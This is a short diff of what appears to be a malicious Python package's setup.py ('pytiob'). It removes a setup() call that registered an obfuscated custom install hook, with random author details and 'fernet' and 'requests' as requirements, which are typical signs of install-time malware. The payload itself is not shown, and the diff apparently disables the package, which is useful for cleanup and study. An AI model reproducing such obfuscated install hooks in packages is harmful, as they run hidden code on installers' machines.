@@ -18,22 +18,5 @@ class dbBJkIRGRmtdhTuaMlppcOLpqJnlGXEWGQQxfWUSRwJaNVArVjCXxdGYXZxLyRVYvAPOAMPHId
             install.run(self)
 
 
-setup(
-    name="pytiob",
-    version=VERSION,
-    author="rGyVUyzSNCYsTgDoP",
-    author_email="pOKLWuPiaTHaFKA@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': dbBJkIRGRmtdhTuaMlppcOLpqJnlGXEWGQQxfWUSRwJaNVArVjCXxdGYXZxLyRVYvAPOAMPHIdJrbkuwoSAkPMOxSQuHwEuaXwnahnWGqwvlVxLhPuiJHceNACJLbgrBSYcmrfxMfnlFIffDFDGXAwYtQVaEHUJHaHVWQIjNLClstqWdjA,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
